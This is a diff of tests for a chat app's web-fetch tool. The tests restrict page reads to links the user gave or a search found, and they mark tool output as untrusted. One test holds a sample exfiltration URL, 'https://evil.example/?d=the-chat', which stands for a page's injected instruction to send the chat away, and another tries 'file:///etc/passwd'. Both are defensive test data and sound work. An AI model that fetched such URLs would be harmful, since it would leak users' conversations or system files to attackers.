@@ -156,7 +156,8 @@ class TestTheLoop:
 
         monkeypatch.setattr(chat_tools_service, "fetch_url_text", trickle)
         monkeypatch.setitem(chat_web_tools.CALL_TIMEOUT_S, "web_fetch", 0.05)
-        text = await WebToolLoop(search=False, fetch=True).run(_fetch_call("https://slow.example"))
+        loop = WebToolLoop(search=False, fetch=True, readable={"https://slow.example"})
+        text = await loop.run(_fetch_call("https://slow.example"))
         assert text == "The web_fetch call did not finish within 0.05 s. Tell the user it timed out."
 
     async def test_a_query_is_needed_and_a_tool_that_is_off_is_not_run(self, searches):
@@ -173,6 +174,7 @@ class TestTheLoop:
 
         monkeypatch.setattr(chat_tools_service, "fetch_url_text", fetch)
         loop = WebToolLoop(search=False, fetch=True)
+        loop.allow_links_in([{"role": "user", "content": "read https://a.example/p please"}])
         text = await loop.run(_fetch_call("https://a.example/p"))
         assert 'source="https://a.example/p"' in text and "content of https://a.example/p" in text
         assert loop.sources == [{"title": "The page", "url": "https://a.example/p"}]
@@ -182,7 +184,7 @@ class TestTheLoop:
             raise RuntimeError("Connection refused")
 
         monkeypatch.setattr(chat_tools_service, "fetch_url_text", fetch)
-        loop = WebToolLoop(search=False, fetch=True)
+        loop = WebToolLoop(search=False, fetch=True, readable={"https://down.example"})
         text = await loop.run(_fetch_call("https://down.example"))
         assert "could not be read: Connection refused" in text
         assert loop.sources == []
@@ -195,12 +197,38 @@ class TestTheLoop:
             return "text"
 
         monkeypatch.setattr(chat_tools_service, "fetch_url_text", fetch)
-        loop = WebToolLoop(search=False, fetch=True)
+        loop = WebToolLoop(search=False, fetch=True, readable={f"https://s{i}.example" for i in range(9)})
         assert "full http(s) address" in await loop.run(_fetch_call("file:///etc/passwd"))
         for i in range(MAX_FETCHES + 1):
             last = await loop.run(_fetch_call(f"https://s{i}.example", f"f{i}"))
         assert "used up" in last
         assert len(read) == MAX_FETCHES
+
+    async def test_only_pages_the_person_linked_or_a_search_found_are_read(self, monkeypatch, searches):
+        read: list[str] = []
+
+        async def fetch(url, **kwargs):
+            read.append(url)
+            return "text"
+
+        monkeypatch.setattr(chat_tools_service, "fetch_url_text", fetch)
+        loop = WebToolLoop(search=True, fetch=True)
+        loop.allow_links_in(
+            [
+                {"role": "user", "content": "see https://mine.example/doc/"},
+                {"role": "assistant", "content": "and https://said-by-the-model.example"},
+                {"role": "user", "content": "notes\n\n--- file.txt ---\nhttps://inside-a-file.example"},
+            ]
+        )
+        # A page's instructions to send the chat away are not followed.
+        refused = await loop.run(_fetch_call("https://evil.example/?d=the-chat"))
+        assert "was not read" in refused
+        for url in ("https://said-by-the-model.example", "https://inside-a-file.example"):
+            assert "was not read" in await loop.run(_fetch_call(url))
+        await loop.run(_fetch_call("https://mine.example/doc#part", "f2"))
+        await loop.run(_search_call("gold"))
+        await loop.run(_fetch_call("https://a.example/1", "f3"))
+        assert read == ["https://mine.example/doc#part", "https://a.example/1"]
 
     async def test_an_unknown_tool_and_broken_arguments(self, searches):
         loop = WebToolLoop(search=True, fetch=True)
@@ -235,8 +263,10 @@ class TestARoundToldAsWords:
         flat = flatten_tool_rounds(messages)
         assert [m["role"] for m in flat] == ["system", "user", "assistant", "user"]
         assert flat[2] == {"role": "assistant", "content": "Let me look."}
-        assert 'web_search({"query": "gold price"}):\nRESULTS' in flat[3]["content"]
-        assert 'web_fetch({"url": "https://a.example"}):\nPAGE' in flat[3]["content"]
+        told = flat[3]["content"]
+        assert told.count("BEGIN_UNTRUSTED_TOOL_CALL") == 2 and told.count("BEGIN_UNTRUSTED_TOOL_OUTPUT") == 2
+        assert '{"query": "gold price"}' in told and "RESULTS" in told and "PAGE" in told
+        assert told.index("web_search, called with:") < told.index("web_fetch, called with:")
         assert all("tool_calls" not in m for m in flat)
 
     def test_a_chat_without_rounds_is_unchanged(self):
@@ -402,6 +432,26 @@ class TestATurnWithTheTools:
         assert resp.status_code == 200
         assert len(provider.calls) == 2
         assert searches.queries == ["gold price today"]
+
+    async def test_the_model_reads_a_page_the_person_linked(self, client, turn, provider, monkeypatch):
+        read: list[str] = []
+
+        async def fetch(url, **kwargs):
+            read.append(url)
+            return f"Title: Report\n\ntext of {url}"
+
+        monkeypatch.setattr(chat_tools_service, "fetch_url_text", fetch)
+        provider.reply(
+            _call(0, call_id="call_f", name="web_fetch", arguments='{"url":"https://r.example/report"}'),
+            _finish("tool_calls"),
+        ).reply(_text("Summary.", "stop"))
+        body = _ask(turn.model, "summarise https://r.example/report", tools={"web_fetch": True})
+        body.pop("web_search")
+        resp = await client.post("/api/chat/completions", json=body, headers=turn.headers)
+        frames = _frames(resp.text)
+        assert read == ["https://r.example/report"]
+        assert {"web_sources": [{"title": "Report", "url": "https://r.example/report"}]} in _alpha_router(frames)
+        assert [t["function"]["name"] for t in provider.calls[0]["tools"]] == ["web_fetch"]
 
     async def test_words_before_the_calls_are_kept_apart_from_the_answer(self, client, turn, provider, searches):
         provider.reply(_text("Let me check."), *SEARCH_REPLY).reply(_text("Done.", "stop"))
